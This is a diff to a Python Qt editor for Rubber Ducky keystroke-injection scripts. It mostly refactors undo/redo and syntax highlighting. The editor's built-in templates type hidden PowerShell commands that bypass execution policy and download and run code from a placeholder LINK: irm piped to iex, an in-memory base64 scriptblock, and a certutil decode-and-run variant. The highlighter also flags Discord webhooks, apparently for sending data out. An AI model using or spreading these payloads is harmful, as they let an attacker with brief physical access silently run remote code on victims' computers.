@@ -276,35 +276,34 @@ class CodeEditor(QMainWindow):
     def undoAction(self):
         if not self.history:
             return
-        self.redo_stack.append(self.text_edit.toPlainText())
+
+        self.redo_stack.append((self.text_edit.toHtml()))
         prev_state = self.history.pop()
 
-        cursor = self.text_edit.textCursor()
-        current_position = cursor.position()
-
         self.text_edit.textChanged.disconnect(self.colorizeText)
-        self.setColoredText(prev_state)
+        self.text_edit.setHtml(prev_state)
         self.text_edit.textChanged.connect(self.colorizeText)
 
-        cursor.setPosition(min(current_position, len(prev_state)))
+        cursor = self.text_edit.textCursor()
+        current_position = min(cursor.position(), len(prev_state))
+        cursor.setPosition(current_position)
         self.text_edit.setTextCursor(cursor)
 
     def redoAction(self):
         if not self.redo_stack:
             return
-        self.history.append(self.text_edit.toPlainText())
+
+        self.history.append((self.text_edit.toHtml()))
         next_state = self.redo_stack.pop()
 
-        cursor = self.text_edit.textCursor()
-        current_position = cursor.position()
-
         self.text_edit.textChanged.disconnect(self.colorizeText)
-        self.setColoredText(next_state)
+        self.text_edit.setHtml(next_state)
         self.text_edit.textChanged.connect(self.colorizeText)
 
-        cursor.setPosition(min(current_position, len(next_state)))
+        cursor = self.text_edit.textCursor()
+        current_position = min(cursor.position(), len(next_state))
+        cursor.setPosition(current_position)
         self.text_edit.setTextCursor(cursor)
-
 
     def loadFreshCode(self):
         self.text_edit.clear()
@@ -327,7 +326,7 @@ class CodeEditor(QMainWindow):
             error_dialog.exec_()
             return
 
-        key_map = { #doesnt include all ducky commands yet. theres a way easier way to do this. but that means i have to restart lol.
+        key_map = { #doesnt include all ducky commands yet
             "GUI r": ("hotkey", ('win', 'r')),
             "GUI R": ("hotkey", ('win', 'r')),
             "GUI d": ("hotkey", ('win', 'd')),
@@ -469,7 +468,7 @@ class CodeEditor(QMainWindow):
     def colorizeText(self):
         self.text_edit.textChanged.disconnect(self.colorizeText)
 
-        self.history.append(self.text_edit.toPlainText())
+        self.history.append((self.text_edit.toHtml()))
         self.redo_stack.clear()
         self.text_edit.cursorPositionChanged()
 
@@ -513,7 +512,9 @@ class CodeEditor(QMainWindow):
             "powershell", "Powershell"
         ]
         outofnameslol = [
-            "bypass", "hidden", "H", "Bypass", "Hidden", "h"
+            "NoP", "nop", "ep", "bypass", "noprofile", "hidden", "windowstyle", "executionpolicy", "W", "H", "Ep",
+             "Bypass", "NoProfile", "WindowStyle", "Hidden", "w", "h",
+             "ExecutionPolicy"
         ]
 
         color_mapping = {
@@ -604,42 +605,6 @@ class CodeEditor(QMainWindow):
                 self.text_edit.setPlainText(file.read())
             self.current_file = file_name
 
-    def setColoredText(self, text):
-        self.text_edit.clear()
-        cursor, format = self.text_edit.textCursor(), QTextCharFormat()
-        color_mapping = {
-            ("DELAY", "GUI", "STRING", "ENTER", "TAB", ";", "|", "ESC", "ALT", "CTRL", "UPARROW", "SHIFT", "DOWNARROW",
-             "LEFTARROW", "RIGHTARROW", "HOME", "END", "INSERT", "DELETE", "PAGEUP", "PAGEDOWN", "CAPSLOCK", "NUMLOCK",
-             "SCROLLLOCK", "SPACE", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12",
-             "PRINTSCREEN", "WINDOWS", "STRINGLN", "CONTROL", "ESCAPE", "UP", "DOWN", "RIGHT", "LEFT"): "orange",
-            ("irm", "iex", "iwr", "curl", "certutil", "icm"): "#00ccff",
-            ("LINK", "FUNCTION", "WEBHOOK", "DISCORD", "discord", "Discord", "Webhook", "webhook", "link",
-             "Link", "url", "URL", "TARGET", "Target", "target"): "#F44444",
-            ("bypass", "hidden", "H", "Bypass", "Hidden", "h"): "#ff80ff",
-            ("powershell", "Powershell"): "#8A46A6",
-            ("REM"): "gray",
-            "default": "white"
-        }
-
-        for line in text.split('\n'):
-            gray_mode = False
-            for word in re.split(r'(\W+)', line):
-                if word == "REM":
-                    gray_mode = True
-                    format.setForeground(QColor("gray"))
-                elif gray_mode:
-                    format.setForeground(QColor("gray"))
-                else:
-                    for words, color in color_mapping.items():
-                        if word in words:
-                            format.setForeground(QColor(color))
-                            break
-                    else:
-                        format.setForeground(QColor(color_mapping["default"]))
-                cursor.setCharFormat(format)
-                cursor.insertText(word)
-            cursor.insertText('\n')
-
     def save(self):
         if self.current_file:
             with open(self.current_file, 'w') as file:
@@ -664,7 +629,8 @@ DELAY 500
 STRING powershell -NoP -W H -Ep Bypass &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm LINK)))))
 DELAY 500
 ENTER"""
-        self.setColoredText(memory_execution_code)
+        self.text_edit.setPlainText(memory_execution_code)
+        self.colorizeText()
 
     def loadBasicCode(self):
         basic_code = """DELAY 2000
@@ -673,7 +639,8 @@ DELAY 500
 STRING powershell -NoP -W H -Ep Bypass irm LINK|iex;FUNCTION 
 DELAY 500
 ENTER"""
-        self.setColoredText(basic_code)
+        self.text_edit.setPlainText(basic_code)
+        self.colorizeText()
 
     def loadBase64Code(self):
         base64_code = """REM The script must interface with a Base64-encoded LINK for proper functionality.
@@ -683,7 +650,8 @@ DELAY 500
 STRING powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
 DELAY 500
 ENTER"""
-        self.setColoredText(base64_code)
+        self.text_edit.setPlainText(base64_code)
+        self.colorizeText()
 
 def main():
     app = QApplication(sys.argv)
